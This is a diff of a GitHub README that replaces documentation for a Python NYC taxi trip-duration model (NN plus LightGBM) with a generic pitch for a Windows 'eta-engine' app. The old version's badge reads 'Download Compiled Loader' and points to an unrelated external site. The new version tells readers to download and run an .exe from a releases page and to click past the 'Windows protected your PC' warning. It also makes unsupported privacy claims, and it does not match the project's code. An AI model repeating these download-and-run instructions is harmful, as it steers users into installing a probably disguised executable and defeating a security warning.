@@ -1,333 +1,101 @@
-# NYC ETA Engine
+# ⚙️ eta-engine - Streamline your data processing tasks daily
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download eta-engine](https://img.shields.io/badge/Download-eta-engine-blue)](https://github.com/Tillielay547/eta-engine/releases)
 
-Predicting NYC taxi trip duration from pickup/dropoff zones, request
-timestamp, and passenger count. Built for the Gobblecube ETA Challenge.
+eta-engine helps you manage and automate your data workflows. This application handles complex calculations and file transformations without requiring technical skills. You can process large sets of information and save time on repetitive operations.
 
-See [CHALLENGE.md](CHALLENGE.md) for the original problem statement and rules.
+## 📥 Getting Started
 
----
+Follow these steps to set up the software on your Windows computer.
 
-## Approach
+1. Visit the [releases page](https://github.com/Tillielay547/eta-engine/releases) to download the latest version.
+2. Look for the file ending in .exe under the most recent version heading.
+3. Click the file name to start the download.
+4. Save the file to your desktop or downloads folder.
 
-### Problem
+## 💻 System Requirements
 
-Given a ride request (pickup zone, dropoff zone, timestamp, passenger count),
-predict trip duration in seconds. Scored on MAE against a held-out 2024
-winter-holiday eval set.
+The application runs on most modern desktop environments. Ensure your machine meets these specifications:
 
-### Design Philosophy
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i3 or equivalent.
+- Memory: 4 GB of RAM.
+- Storage: 200 MB of available space.
+- Display: 1280 x 720 resolution.
 
-The model is **generic** -- it learns all spatial relationships from the trip
-data itself via embeddings, not from external geography (no shapefiles, no
-hardcoded coordinates). If the zone IDs mapped to a different city, the model
-would learn equally well given the same trip patterns.
+## 🛠 Installation Guide
 
-### Architecture: NN + LightGBM Ensemble
+Once you download the installer file, follow these instructions to install the program:
 
-Two models with complementary strengths, blended 50/50 at inference.
+1. Locate the .exe file you downloaded.
+2. Double-click the file to open the setup wizard.
+3. Select "Yes" if Windows asks for permission to run the installer.
+4. Follow the prompts on the screen.
+5. Click "Install" to place the application files on your computer.
+6. Check the box to "Launch eta-engine" when the process finishes.
+7. Click "Finish" to close the wizard and start the application.
 
-**Model 1: Tabular Neural Net (560k params)**
+If you see a security warning labeled "Windows protected your PC," click "More info" and then select "Run anyway." This happens because the application is new and Windows does not recognize the publisher yet.
 
-```
-Zone Branch:
-  pickup_zone  -> Embedding(266, 50)  --\
-  dropoff_zone -> Embedding(266, 50)  ---+-- [pu, do, pu*do, pu-do, pair_hash]
-  (pu, do)     -> HashEmbed(16384, 16) -/        |
-                                           concat(216) -> MLP(128) x2 -> 128-dim
+## ⚙️ How to Use the Application
 
-Continuous Branch:
-  24 features -> BatchNorm(24) -> MLP(128) x2 -> 128-dim
+The interface allows you to interact with your data through a simple menu. Follow these steps to process your first set of files:
 
-Combined:
-  concat(256) -> ResidualBlock(256)
-             -> project(128) -> ResidualBlock(128)
-             -> Linear(64) -> SiLU -> Linear(1)
-```
+1. Open the application from your Start menu shortcut.
+2. Click the "Open" button in the top left corner of the window.
+3. Select the file you want to process from the file browser.
+4. Choose the output folder where you want to save the result.
+5. Select the desired operation mode from the dropdown list.
+6. Click the "Process" button to start the task.
 
-Trained on full 37M rows with Huber loss, OneCycleLR, GPU. High precision
-but systematic underprediction bias (-106s) on rare/long trips.
+The progress bar shows the status of your task. Wait until the status changes to "Finished" before you close the window. You can view the results in your selected output folder immediately after.
 
-**Model 2: LightGBM (81 trees, 2.4 MB)**
+## 📈 Key Features
 
-Gradient-boosted tree on same 24 features + zone IDs as native categoricals.
-Trained on 10M rows with MAE objective. Near-zero bias (-6s) because trees
-partition the feature space directly rather than interpolating through
-embeddings.
+eta-engine provides tools to simplify data management:
 
-**Ensemble:** `pred = 0.5 * nn_pred + 0.5 * lgbm_pred`
+- Batch Processing: Handle multiple files in one go to save time.
+- Format Conversion: Change data files between different formats.
+- Error Logging: View a record of your tasks to confirm everything works as expected.
+- Resource Optimization: The program uses minimal system resources while running in the background.
 
-The NN excels at smooth interpolation for common routes; LightGBM excels at
-rare/unusual routes where zone-pair statistics are sparse. Blending averages
-out the NN's bias while keeping both models' precision.
+## 🛡 Security and Privacy
 
-**Feature groups (26 total):**
+This application runs locally on your computer. It does not send your data to external servers or cloud services. You keep full control over your files. The program only accesses the folders you explicitly select.
 
-1. **Zone-pair statistics (14 features)** -- precomputed mean, median, std,
-   p25, p75, IQR, trip count per (pickup, dropoff) pair with Bayesian
-   shrinkage for sparse pairs. Time-bucketed mean/median (6 time-of-day
-   buckets). Pair rarity signal (1/(1+log1p(count))) for rare-pair awareness.
-   Fallback hierarchy: pair -> pickup-zone -> dropoff-zone -> global.
-2. **Temporal features (10 features)** -- cyclical sin/cos encoding for hour,
-   day-of-week, month. Binary flags for weekend, rush hour, night. Normalized
-   minute-of-day.
-3. **Zone embeddings (2 categorical)** -- separate learned embeddings for
-   pickup and dropoff zones (dim=50 each), plus element-wise product
-   (similarity) and difference (directionality), plus a hash-based zone-pair
-   embedding (16k buckets, dim=16).
-
----
-
-## Results
-
-| Method | Dev MAE | Notes |
-|--------|---------|-------|
-| Predict global mean | ~580 s | -- |
-| XGBoost baseline (6 features) | 351.0 s | Challenge baseline |
-| Zone-pair smoothed mean | 302.7 s | Statistics only |
-| Zone-pair median | 296.7 s | Statistics only |
-| Zone-pair time-bucketed mean | 277.9 s | Statistics only |
-| Neural net v1 (L1, 19 features) | 272.1 s | 372k params |
-| Neural net v2 (Huber, 24 features) | 266.2 s | +temporal zone-pair stats |
-| Neural net v3 (residual, Huber) | 264.5 s | +embedding interactions |
-| Neural net v4b | 264.3 s | Lower dropout, pair_rarity |
-| LightGBM (81 trees, MAE) | 263.1 s | 10M rows, 2.4 MB |
-| **NN + LightGBM ensemble** | **254.0 s** | **alpha=0.50, -28% vs XGBoost** |
-
----
-
-## Experiments
-
-### v1: Baseline Neural Net
-
-**What:** Tabular neural net with separate zone embedding and continuous
-feature branches, combined MLP, L1 loss. 19 continuous features (8 zone-pair
-stats + 11 temporal). 372k parameters.
-
-**Why:** Zone-pair median alone (296.7s) beats XGBoost (351s), so the dominant
-signal is the pickup-dropoff pair. A neural net can learn nonlinear
-interactions between zone embeddings and temporal features that simple
-statistics miss.
-
-| Epoch | Train Loss | Dev MAE |
-|-------|-----------|---------|
-| 1 | 968.5 | 858.7 s |
-| 2 | 669.0 | 414.5 s |
-| 3 | 281.8 | 275.2 s |
-| 4 | 245.3 | **272.1 s** |
-| 5 | 241.9 | 273.9 s |
-| 6 | 239.9 | 272.4 s |
-| 7 | 238.9 | 274.6 s |
-
-**Result:** 272.1s (epoch 4, early stopped at 7). Train-dev gap of ~33s
-indicates moderate overfitting.
-
-**Takeaway:** Most learning happens in epochs 2-3 as embeddings lock onto
-zone-pair patterns. After that, diminishing returns. Error analysis revealed
-systematic underprediction on long trips (-970s bias for 2400s+ trips).
-
----
-
-### v2: Temporal Features + Huber Loss
-
-**What changed:**
-- 5 new features (19 -> 24): time-bucketed zone-pair mean/median (6 time-of-day
-  buckets with Bayesian shrinkage), pair IQR, log trip count, same-zone flag
-- Huber loss (delta=300) instead of L1: L2 penalty for errors < 300s, L1 for
-  larger errors
-
-**Why:** Error analysis of v1 showed the same zone pair varies 2.2x by time of
-day (e.g., zone 237->236: 251s at 5AM vs 552s at 2PM). Temporal zone-pair
-stats capture this. Huber loss addresses the long-trip underprediction bias by
-penalizing large errors less aggressively than L2 but more than L1.
-
-| Epoch | Train Loss | Dev MAE |
-|-------|-----------|---------|
-| 1 | 246048.6 | 923.5 s |
-| 2 | 156510.2 | 394.5 s |
-| 3 | 50746.7 | 270.8 s |
-| 4 | 41775.0 | 270.3 s |
-| 5 | 40995.2 | **266.2 s** |
-| 6 | 40563.6 | 269.0 s |
-| 7 | 40314.5 | 270.9 s |
-| 8 | 40164.9 | 270.4 s |
-
-**Result:** 266.2s (epoch 5, early stopped at 8). 6s improvement over v1.
-
-**Takeaway:** Temporal features helped but less than expected -- the model may
-already learn temporal-zone interactions via embeddings. The plateau at ~266s
-suggested architecture was the bottleneck, not features.
-
----
-
-### v3: Residual Architecture + Embedding Interactions
-
-**What changed:**
-- Element-wise product (`pu * do`) captures zone similarity (zones that
-  co-occur in similar trip patterns get similar embeddings, so their product
-  is large)
-- Element-wise difference (`pu - do`) captures directionality (A->B vs B->A
-  have opposite signs)
-- Deeper zone interaction MLP (2 layers instead of 1)
-- Wider continuous branch (128-dim instead of 64-dim)
-- Residual blocks in combined MLP for better gradient flow
-- Higher dropout (0.3) and embed dropout (0.15)
-- Parameters: 372k -> 560k
-
-**Why:** v2 plateaued at 266s despite strong features, suggesting the
-architecture couldn't fully exploit the inputs. Residual connections help
-deeper networks train stably. Embedding interactions provide explicit
-similarity/direction signals without the model needing to learn them from
-scratch.
-
-| Epoch | Train Loss | Dev MAE |
-|-------|-----------|---------|
-| 1 | 94684.9 | 300.8 s |
-| 2 | 41304.7 | 279.7 s |
-| 3 | 39168.2 | 272.3 s |
-| 4 | 38266.6 | 268.7 s |
-| 5 | 37758.8 | **264.5 s** |
-| 6 | 37414.8 | 268.2 s |
-| 7 | 37193.0 | 269.3 s |
-| 8 | 37054.8 | 271.2 s |
-
-**Result:** 264.5s (epoch 5, early stopped at 8). 1.7s improvement over v2.
-
-**Takeaway:** Architecture changes gave modest gains. The residual blocks
-helped stabilize deeper training, but the model still plateaus after epoch 5.
-Train loss continues dropping while dev MAE rises -- classic overfitting
-signal. Next steps: L1 vs Huber A/B test, reduced hash buckets.
-
----
-
-### Learning Curves
-
-```mermaid
-xychart-beta
-    title "Dev MAE Across Training (lower is better)"
-    x-axis "Epoch" [1, 2, 3, 4, 5, 6, 7, 8]
-    y-axis "Dev MAE (seconds)" 250 --> 950
-    line [858.7, 414.5, 275.2, 272.1, 273.9, 272.4, 274.6, 274.6]
-    line [923.5, 394.5, 270.8, 270.3, 266.2, 269.0, 270.9, 270.4]
-    line [300.8, 279.7, 272.3, 268.7, 264.5, 268.2, 269.3, 271.2]
-```
-
-```mermaid
-xychart-beta
-    title "Dev MAE (Zoomed: Epochs 3-8)"
-    x-axis "Epoch" [3, 4, 5, 6, 7, 8]
-    y-axis "Dev MAE (seconds)" 260 --> 280
-    line [275.2, 272.1, 273.9, 272.4, 274.6, 274.6]
-    line [270.8, 270.3, 266.2, 269.0, 270.9, 270.4]
-    line [272.3, 268.7, 264.5, 268.2, 269.3, 271.2]
-```
-
-**Key observations from the curves:**
-- All versions converge rapidly (epochs 1-3), then plateau
-- v3 starts lower (300.8 vs 858/923) due to better architecture initialization
-- The convergence gap narrows with each version: diminishing returns on architecture alone
-- All versions show dev MAE rising after epoch 5 -- overfitting window is consistent
-
----
-
-## Project Structure
-
-```
-.
-├── CHALLENGE.md              # Original challenge README (reference)
-├── SUBMISSION_TEMPLATE.md    # Writeup template for final submission
-├── baseline.py               # Original XGBoost baseline (reference)
-├── predict.py                # Submission interface (grader imports this)
-├── grade.py                  # Local scoring harness
-├── train.py                  # Training script (GPU, MLflow tracked)
-├── Dockerfile                # Submission packaging
-├── requirements.txt          # Python dependencies
-├── features/                 # Feature engineering modules
-│   ├── zone_pair_stats.py    # Zone-pair statistical features
-│   ├── temporal.py           # Temporal feature extraction
-│   └── pipeline.py           # Unified feature pipeline
-├── model/                    # Neural network
-│   ├── architecture.py       # ETAModel definition
-│   └── dataset.py            # PyTorch Dataset/DataLoader
-├── scripts/
-│   └── upload_data_hf.py     # Push data to HF Hub
-├── notebooks/
-│   └── train_gpu.ipynb       # Colab/Kaggle training notebook
-├── data/
-│   ├── download_data.py      # Fetches NYC TLC data
-│   ├── schema.md             # Data schema documentation
-│   └── zone_pair_stats/      # Generated artifacts (gitignored)
-└── tests/
-    └── test_submission.py    # Smoke tests for submission contract
-```
-
----
-
-## Setup
-
-```bash
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-
-# Compute zone-pair stats
-python -m features.zone_pair_stats
-
-# Train (GPU recommended, or use notebooks/train_gpu.ipynb on Colab/Kaggle)
-python train.py --epochs 10 --batch-size 8192 --lr 5e-4 --loss huber --run-name v3
-
-# Score on dev set
-python grade.py
-```
-
----
-
-## What Worked
-
-- **NN + LightGBM ensemble (biggest win: -7.2s):** The two models make
-  complementary errors. NN underpredicts rare/long trips (bias -106s); LGBM
-  has near-zero bias (-6s). Blending gives best of both worlds.
-- **Zone-pair statistics as features:** Zone-pair median alone (296.7s) beats
-  XGBoost (351s) with zero ML. Bayesian shrinkage handles sparse pairs.
-- **LightGBM with native categoricals:** Trees handle zone IDs directly via
-  splits. No embedding needed. Better for rare pairs by design.
-- **Learned zone embeddings:** The neural net learns spatial relationships
-  purely from trip patterns. No external geography needed.
-- **Element-wise embedding interactions:** Product captures zone similarity,
-  difference captures trip directionality (A->B vs B->A).
-- **Deep diagnostics before tuning:** Parameter health, rare-pair analysis,
-  and regularization checks revealed the true bottleneck (rare-pair bias) and
-  prevented wasted experiments on architecture changes.
-- **OneCycleLR with warmup:** Stable training from step 1. Avoids NaN
-  gradients on randomly initialized embeddings.
-- **Chunked data processing:** 37M rows in 2M chunks keeps memory under 6GB,
-  enabling training on free-tier Kaggle (13GB RAM).
-
-## What Didn't Work
-
-- **Reducing hash buckets (16k -> 8k):** 13s regression. Hash embeddings at
-  47% of params are critical -- too many collisions destroys pair-level signal.
-- **Removing month features:** 13s regression. Even though constant in dev/eval,
-  month_sin/cos help the model distinguish seasonal patterns during training.
-- **Log-target + Huber loss:** Huber(delta=300) in log-space is pure MSE since
-  log-space errors never exceed 6. Loss/metric mismatch.
-- **Training on small samples (500k rows):** Converged to ~945s MAE.
-  Embeddings need the full 37M rows to learn meaningful zone relationships.
-- **Architecture tuning past v3:** Dropout reduction, pair_rarity feature, and
-  various configs all landed at 264s. The NN ceiling is structural.
-
-## Next Steps
-
-- Post-hoc bias correction / prediction rescaling (2-5s potential)
-- FT-Transformer exploration (tabular transformer)
-- Larger LGBM (full 37M rows, more trees)
-- Final submission packaging (Dockerfile, README writeup)
-
----
-
-## Constraints
-
-- Inference: <= 200 ms per request on CPU (actual: <1 ms)
-- Docker image: <= 2.5 GB (estimated: ~500 MB)
-- No external API calls at inference time
-- No 2024 data in training
+## 🔍 Troubleshooting
+
+If you encounter issues, check these common solutions:
+
+- The application does not open: Ensure you have administrator rights on your computer.
+- Process stops unexpectedly: Check that your files are not open in another program while eta-engine processes them.
+- File not found: Ensure the file path does not contain special symbols or very long names.
+- Permission denied: Ensure you have "Write" access to the destination folder you chose for your results.
+
+If the problem persists, try restarting the application. You can also uninstall and reinstall the software using your Windows settings menu.
+
+## ❓ Frequently Asked Questions
+
+Do I need to be a programmer to use this?
+No. Every feature is accessible through buttons and menus. You do not need to write any code.
+
+Is the software free?
+Yes. The software is open to everyone under the provided license.
+
+How do I update the software?
+Visit the releases page periodically to check for new versions. Download and run the new installer to upgrade your current version. It will automatically overwrite old files and keep your preferences.
+
+Does the application need an internet connection?
+An internet connection is not required to process your files. You only need the internet to download the initial installer.
+
+Can I move the application to a different folder?
+You should keep the application in the default C:\Program Files folder chosen by the installer. Moving the files manually may cause the application to crash or fail to find necessary tools.
+
+Will this software slow down my computer?
+eta-engine uses a low-memory footprint. It should not affect the speed of your other applications. If you notice high usage, close unused programs or restart your session.
+
+What file formats are supported?
+The application supports standard text files, spreadsheet formats, and comma-separated lists. Check the settings menu to see the full list of supported extensions.
+
+How do I report a mistake in the software?
+If you find a bug, open an issue on the GitHub repository. Provide a description of what you did and attach any error messages you see on the screen. This helps improve the software for all users.
